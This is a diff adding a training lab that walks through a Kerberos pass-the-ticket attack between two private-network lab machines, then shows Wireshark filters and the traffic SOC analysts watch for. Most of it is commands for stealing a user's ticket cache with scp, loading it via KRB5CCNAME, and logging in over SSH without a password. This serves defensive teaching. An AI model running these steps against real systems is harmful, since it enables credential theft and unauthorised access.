@@ -180,3 +180,114 @@ As SOC Analyst you will monitor port 88 for:
 - `ssh -o GSSAPIAuthentication=yes` → Use Kerberos ticket
 
 
+
+### Lab Roles (Realistic Scenario)
+- **Victim Machine** → KDC Server (192.168.100.91) — A user is already logged in with a valid Kerberos ticket.
+- **Attacker Machine** → Your Client Laptop (192.168.100.90) — You steal the ticket and use it to login without password.
+
+---
+
+### **Full Detailed Pass-the-Ticket Lab**
+
+#### **Phase 1: On Victim Machine (KDC Server - 192.168.100.91)**
+
+This simulates a normal user who is already logged in.
+
+```bash
+# 1. Become the normal user (awais)
+su - awais
+```
+
+(Enter the password for awais if asked)
+
+```bash
+# 2. Get a fresh Kerberos ticket (this is what attackers want to steal)
+kinit awais@LAB.LOCAL
+# Enter password: Password123 (or whatever you set)
+
+# 3. Check the ticket
+klist
+```
+
+**Leave this terminal open** (this simulates a logged-in user whose ticket we will steal).
+
+---
+
+#### **Phase 2: On Attacker Machine (Your Client Laptop - 192.168.100.90)**
+
+```bash
+# 1. First, make sure you can reach the victim
+ping -c 3 192.168.100.91
+```
+
+```bash
+# 2. Steal the ticket file from the victim (realistic way)
+# We use scp to copy the ticket cache file from the victim machine
+scp awais@192.168.100.91:/tmp/krb5cc_1000 /tmp/stolen_ticket.kirbi
+```
+
+(Enter the awais password when asked — this is the last time you need to type it)
+
+```bash
+# 3. Check the stolen ticket
+ls -l /tmp/stolen_ticket.kirbi
+```
+
+---
+
+#### **Phase 3: Use the Stolen Ticket (Pass-the-Ticket)**
+
+On your **Client Laptop (Attacker)**:
+
+```bash
+# 4. Tell Kerberos to use the stolen ticket
+export KRB5CCNAME=/tmp/stolen_ticket.kirbi
+
+# 5. Check if the stolen ticket is active
+klist
+```
+
+```bash
+# 6. Login to the Victim machine WITHOUT typing password
+ssh -o GSSAPIAuthentication=yes awais@kdc.lab.local
+```
+
+You should get logged in directly (no password prompt).
+
+Inside the SSH session, run:
+```bash
+whoami
+hostname
+ls /srv/samba/AwaisShare
+exit
+```
+
+---
+
+### **Wireshark Capture (What Abnormal Packets Look Like)**
+
+On your **Client Laptop (Attacker)**:
+
+1. Start Wireshark
+2. Filter:
+   ```
+   kerberos || ssh || (tcp.port == 88 || tcp.port == 22)
+   ```
+3. Start capture
+4. Run the passwordless SSH command again:
+   ```bash
+   ssh -o GSSAPIAuthentication=yes awais@kdc.lab.local
+   exit
+   ```
+
+**What you will see (Abnormal Behavior):**
+
+- **First** → Many **Kerberos** packets on **port 88** (TGS-REQ / TGS-REP)
+- **Then** → SSH packets on **port 22**
+- **No normal password authentication packets** (no NTLM, no basic auth, no password in cleartext)
+- The traffic looks like normal SSH, but the authentication was done using a stolen ticket.
+
+This is what SOC analysts look for — unusual ticket usage from different machines or IPs.
+
+
+
